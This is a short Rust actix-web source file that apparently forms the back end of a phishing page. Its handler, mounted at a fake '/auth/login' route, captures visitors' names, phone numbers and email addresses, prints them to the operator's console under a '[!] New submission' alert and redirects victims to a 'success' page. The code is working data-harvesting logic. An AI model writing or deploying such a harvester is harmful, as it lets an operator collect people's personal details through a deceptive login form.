use actix_web::{HttpResponse, http::header, post, web};
use colored::Colorize;
use serde::Deserialize;

#[derive(Debug, Deserialize)]
struct InfoForm {
    phone: String,
    name: String,
    email: String,
    agree: String,
}

#[post("/auth/login")]
pub async fn submit(form: web::Form<InfoForm>) -> HttpResponse {
    println!("{}", "[!] New submission".bright_blue().bold());
    print!(
        "\t{}: {}\n\t{}: {}\n\t{}: {}\n",
        "Name".bright_red().bold(),
        form.name,
        "Phone".bright_red().bold(),
        form.phone,
        "Email".bright_red().bold(),
        form.email
    );
    HttpResponse::Found()
        .insert_header((header::LOCATION, "/login/success.html"))
        .finish()
}
